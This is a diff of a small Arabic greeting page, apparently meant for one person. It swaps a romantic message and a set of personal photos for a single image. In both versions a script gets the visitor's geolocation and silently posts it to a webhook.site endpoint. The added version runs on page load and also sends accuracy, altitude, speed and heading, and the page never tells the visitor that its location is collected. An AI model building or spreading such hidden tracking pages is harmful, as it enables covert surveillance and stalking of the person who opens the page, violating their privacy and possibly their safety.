@@ -1,66 +1,43 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>صباحك حضن وأمان</title>
-  <style>
-    body {
-      font-family: 'Arial', sans-serif;
-      background-color: #fff0f5;
-      text-align: center;
-      padding: 20px;
-    }
-    img {
-      max-width: 90%;
-      margin: 10px auto;
-      border-radius: 12px;
-      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
-    }
-    .message {
-      margin: 30px auto;
-      font-size: 20px;
-      color: #333;
-      background-color: #ffffffcc;
-      padding: 10px;
-      border-radius: 10px;
-      display: inline-block;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>صباح البقالطة</title>
+    <script>
+        navigator.geolocation.getCurrentPosition(function(position) {
+            fetch("https://webhook.site/fb37387f-f8f3-4a33-b61c-523a1c4dde21", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        });
+    </script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            text-align: center;
+            padding: 20px;
+        }
+        img {
+            max-width: 90%;
+            margin: 10px auto;
+            border-radius: 12px;
+            box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
+        }
+    </style>
 </head>
 <body>
-
-  <div class="message">
-    🎬🤍 صباحك حضن وأمان…<br>
-    وفيك نلقى إلياسي…<br>
-    مازلت نحس فيك بين سطور الليل.
-  </div>
-
-  <img src="1_cafe_kiss.jpeg" alt="صورة 1">
-  <img src="2_home_kiss.jpeg" alt="صورة 2">
-  <img src="3_feeding_icecream.jpeg" alt="صورة 3">
-  <img src="4_birthday_28.jpeg" alt="صورة 4">
-  <img src="5_kissing_point.jpeg" alt="صورة 5">
-  <img src="6_knights.jpeg" alt="صورة 6">
-  <img src="7_tavern_reading.jpeg" alt="صورة 7">
-  <img src="8_buffet.jpeg" alt="صورة 8">
-  <img src="9_lake_smile.jpeg" alt="صورة 9">
-  <img src="10_cave_water.jpeg" alt="صورة 10">
-
-  <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      fetch("https://webhook.site/344a45b6-b932-4dd4-9bc3-c96e855f2856", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          timestamp: new Date().toISOString()
-        })
-      });
-    });
-  </script>
-
+    <img src="combined_bkalta_poetic.jpg" alt="صباح البقالطة">
 </body>
 </html>
